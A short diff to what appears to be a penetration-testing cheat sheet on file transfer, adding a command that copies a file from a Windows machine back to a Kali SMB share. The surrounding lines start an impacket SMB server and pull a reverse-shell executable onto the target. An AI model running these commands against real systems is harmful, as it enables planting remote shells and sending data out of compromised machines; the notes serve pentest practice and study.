@@ -88,6 +88,8 @@ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
 - On Windows (update the IP address with your Kali IP):
 ````
 copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
+#Reverse Copy FROM Windows
+copy output.txt \\10.10.14.22\kali\output.txt
 ````
 ## Wget
 ````
